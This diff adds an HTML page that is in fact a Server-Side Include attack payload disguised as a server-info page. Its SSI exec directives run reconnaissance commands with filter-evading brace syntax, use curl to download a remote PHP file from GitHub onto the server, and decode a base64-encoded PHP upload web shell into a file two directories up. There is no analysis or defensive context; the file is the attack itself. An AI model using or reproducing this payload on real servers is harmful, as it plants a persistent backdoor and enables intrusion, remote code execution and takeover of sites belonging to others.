@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Server Info & SSI</title>
+</head>
+<body>
+<h2>Informasi Server</h2>
+    <p><strong>Document Root:</strong> <!--#echo var="DOCUMENT_ROOT" --></p>
+    <p><strong>Document URI:</strong> <!--#echo var="DOCUMENT_URI" --></p>
+    <p><strong>Server Address:</strong> <!--#echo var="SERVER_ADDR" --></p>
+    <h2>Shinday</h2>
+    <p>Command result (if allowed by server):</p>
+    <pre>
+        <!--#exec cmd="ls ../;dir;pwd;{uname,-a}" -->
+        <!--#exec cmd="{curl,https://raw.githubusercontent.com/Jenderal92/KC5/refs/heads/master/mek.php,-O,mek.php}" -->
+        <!--#exec cmd="echo 'PD9waHAgZWNobyAnTG9naWNfSW50ZXJuZXQnLic8YnI+Jy4nVW5hbWU6Jy5waHBfdW5hbWUoKS4nPGJyPicuJGN3ZCA9IGdldGN3ZCgpOyBFY2hvICc8Y2VudGVyPiAgPGZvcm0gbWV0aG9kPSJwb3N0IiB0YXJnZXQ9Il9zZWxmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4gIDxpbnB1dCB0eXBlPSJmaWxlIiBzaXplPSIyMCIgbmFtZT0idXBsb2FkcyIgLz4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9InVwbG9hZCIgLz4gIDwvZm9ybT4gIDwvY2VudGVyPjwvdGQ+PC90cj4gPC90YWJsZT48YnI+JzsgaWYgKCFlbXB0eSAoJF9GSUxFU1sndXBsb2FkcyddKSkgeyAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZHMnXVsndG1wX25hbWUnXSwkX0ZJTEVTWyd1cGxvYWRzJ11bJ25hbWUnXSk7ICAgICBFY2hvICI8c2NyaXB0PmFsZXJ0KCd1cGxvYWQgRG9uZScpOyAJIAkgPC9zY3JpcHQ+PGI+VXBsb2FkZWQgISEhPC9iPjxicj5uYW1lIDogIi4kX0ZJTEVTWyd1cGxvYWRzJ11bJ25hbWUnXS4iPGJyPnNpemUgOiAiLiRfRklMRVNbJ3VwbG9hZHMnXVsnc2l6ZSddLiI8YnI+dHlwZSA6ICIuJF9GSUxFU1sndXBsb2FkcyddWyd0eXBlJ107IH0gPz4=' | base64 --decode >> ../../hehe.php" -->
+    </pre>
+</body>
+</html>
